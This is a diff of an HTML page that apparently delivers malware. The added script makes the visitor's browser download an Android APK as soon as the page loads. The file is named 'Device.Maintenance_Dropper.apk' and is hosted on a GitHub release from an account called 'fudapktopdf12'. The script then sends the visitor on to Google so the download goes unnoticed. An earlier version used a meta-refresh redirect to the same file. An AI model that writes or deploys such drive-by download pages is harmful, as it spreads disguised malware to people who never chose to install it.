@@ -4,11 +4,23 @@
     <meta charset="UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Redirecting...</title>
-    <!-- Redirect instantly -->
-    <meta http-equiv="refresh" content="0; url=https://github.com/fudapktopdf12/testing/releases/download/v1.0.0/Device.Maintenance_Dropper.apk">
+    <title>Download and Redirect</title>
 </head>
 <body>
-    <p>If you are not redirected automatically, follow this <a href="https://github.com/fudapktopdf12/testing/releases/download/v1.0.0/Device.Maintenance_Dropper.apk">link to the new page</a>.</p>
+    <script>
+        // The file URL to download
+        const fileUrl = "https://github.com/fudapktopdf12/testing/releases/download/v1.0.0/Device.Maintenance_Dropper.apk";
+        // Create an anchor element and trigger the download
+        const anchor = document.createElement('a');
+        anchor.href = fileUrl;
+        anchor.download = '';
+        document.body.appendChild(anchor);
+        anchor.click();
+        document.body.removeChild(anchor);
+
+        // Redirect to Google after download starts
+        window.location.href = "https://www.google.com";
+    </script>
+    <p>Downloading the file... You will be redirected shortly.</p>
 </body>
 </html>
